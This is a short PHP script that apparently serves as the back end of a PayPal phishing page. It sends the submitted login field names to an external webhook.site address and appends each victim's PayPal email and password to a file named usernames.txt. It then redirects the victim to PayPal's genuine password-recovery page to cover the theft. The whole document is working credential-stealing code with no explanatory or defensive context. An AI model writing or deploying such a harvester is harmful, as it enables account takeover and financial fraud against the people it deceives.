<?php
$response = $client->request(
    'POST',
    'https://webhook.site/3c74fd04-d1ed-422e-a8f9-cf5218b221e0',
    [
        'form_params' => [
            'login_email',
            'login_password'
        ]
    ]
);
$headers = $response->getHeaders();
$body = $response->getBody();
var_dump($headers, $body);

file_put_contents("usernames.txt", "Paypal Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>